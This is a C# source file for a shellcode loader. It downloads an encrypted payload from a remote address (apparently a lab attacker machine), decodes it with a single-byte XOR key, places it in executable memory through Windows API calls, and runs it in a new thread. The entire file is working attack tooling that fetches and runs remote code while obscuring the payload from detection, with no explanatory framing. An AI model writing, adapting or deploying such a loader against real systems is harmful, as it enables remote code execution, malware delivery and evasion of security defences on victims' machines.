using System;
using System.Net;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    static void Main()
    {
        string url = "http://10.10.14.149:8000/shell.enc"; 

        // 1. Download shellcode
        byte[] shellcode = new WebClient().DownloadData(url);

        // Decrypt shellcode
        int i = 0;
        while (i < shellcode.Length)
        {
            shellcode[i] = (byte)(shellcode[i] ^ 0x5a);
            i++;
        }
        Console.WriteLine($"[+] Downloaded {shellcode.Length} bytes");

        // 2. Allocate memory
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

        // 3. Copy shellcode
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // 4. Execute
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
